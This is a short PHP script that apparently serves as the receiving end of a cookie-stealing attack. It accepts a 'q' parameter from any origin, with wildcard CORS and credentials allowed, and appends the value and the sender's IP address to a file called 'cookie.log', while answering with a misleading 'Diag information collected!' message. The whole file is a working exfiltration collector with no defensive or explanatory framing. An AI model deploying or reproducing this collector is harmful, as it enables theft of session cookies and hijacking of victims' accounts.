<?php

if (!empty($_SERVER["REQUEST_METHOD"])) {
    $outLog = './lots/cookie.log';
    echo "Diag information collected!";
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: ".$_SERVER["REMOTE_ADDR"]."\nContents: ".$req_dump."\n", FILE_APPEND);
            http_response_code(200);
        }
    }
}
